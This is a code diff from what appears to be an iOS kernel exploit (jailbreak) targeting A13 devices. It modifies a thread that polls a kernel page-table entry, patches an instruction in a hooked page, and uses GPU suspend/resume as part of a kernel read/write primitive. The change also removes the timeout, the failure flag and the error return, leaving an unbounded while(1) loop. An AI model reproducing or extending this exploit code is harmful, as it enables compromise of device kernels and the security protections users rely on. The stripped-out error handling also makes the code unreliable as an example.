@@ -60,12 +60,12 @@ static void gfx_write_cachelines(uint64_t shc_in, uint64_t shc_out, uint64_t ttb
     }
 }
 
+// 严格对齐 Dopamine：只在 counter==1000 时 suspend/resume 一次，避免反复打 IOMFB 引发 panic。
 static void *wait_for_pte(void *data) {
     uint32_t counter = 0;
-    const uint32_t timeout_ms = 20000;
     usleep(1000);
     
-    while (!stop_write) {
+    while (1) {
         if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
             *(volatile uint32_t *)data = 0xF100003F; // cmp x1, #0
             asm volatile ("dsb sy");
@@ -77,16 +77,9 @@ static void *wait_for_pte(void *data) {
         }
         
         usleep(1000);
-        ++counter;
-        if (counter == 1000 || (counter > 1000 && (counter % 2000) == 0)) {
+        if (++counter == 1000) {
             gfx_suspend();
             gfx_resume();
-        }
-        if (counter >= timeout_ms) {
-            debug_log("A13 wait_for_pte TIMEOUT after %u ms\n", counter);
-            momentarius_wait_failed = true;
-            stop_write = true;
-            break;
         }
     }
     return NULL;
@@ -328,17 +321,11 @@ int momentarius_init_A13(void) {
     uint64_t hook_output = hook_page + (momentarius.gfx.hook_offset & 0x3fff);
     
     pthread_t wait_thread = NULL;
-    momentarius_wait_failed = false;
     stop_write = false;
     pthread_create(&wait_thread, NULL, wait_for_pte, (void *)hook_input);
     
     gfx_write_cachelines(shc_input, shc_output, ttbr1_input, ttbr1_output, hook_input, hook_output);
     pthread_join(wait_thread, NULL);
-
-    if (momentarius_wait_failed) {
-        debug_log("momentarius_init_A13 failed: wait_for_pte timeout\n");
-        return -1;
-    }
     
     momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
     momentarius.orig_pte = kread64(momentarius.target_rw_pte);
